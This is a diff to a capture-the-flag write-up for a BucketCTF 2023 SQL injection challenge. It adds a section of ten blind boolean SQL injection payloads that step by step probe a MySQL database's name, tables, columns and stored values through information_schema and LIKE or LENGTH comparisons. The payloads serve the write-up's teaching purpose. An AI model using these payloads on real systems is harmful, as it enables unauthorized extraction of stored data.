@@ -217,6 +217,21 @@ Let's run it:
 
 Flag is <code>bucket{j01n5_m4k3_n0_53n53_a5ed15}</code>.
 
+## Payloads
+
+These payloads should be used in loops with different values (as shown in the codes above).
+
++ <code>' OR (SELECT LENGTH(database()))=numeric_value#</code> for the length of the database name;<br>
++ <code>' OR (SELECT SUBSTRING(database(),1,numeric_value))='substring'#</code> for database name;<br>
++ <code>' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=numeric_value#</code> for the tables count in the database;<br>
++ <code>' OR (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=numeric_value#</code> for the length of the first table name;<br>
++ <code>' OR (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE 'substring%'#</code> for the first table name;<br>
++ <code>' OR (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name')=numeric_value#</code> for the columns count in the first table;<br>
++ <code>' OR (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1)=numeric_value#</code> for the length of the second column name of the first table;<br>
++ <code>' OR (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='first_table_name' LIMIT 1,1) LIKE 'substring%'#</code> for the second column name of the first table;<br>
++ <code>' OR (SELECT LENGTH(second_column_name) FROM first_table_name LIMIT 0,1)=numeric_value#</code> for the length of the flag;<br>
++ <code>' OR (SELECT second_column_name FROM first_table_name LIMIT 0,1) LIKE 'substring%'#</code> for the flag.<br>
+
 ## References
 <a id="1">[1]</a> 
 https://github.com/H31s3n-b3rg/BucketCTF_2023/blob/main/SQLi/SQLi-2/README.md
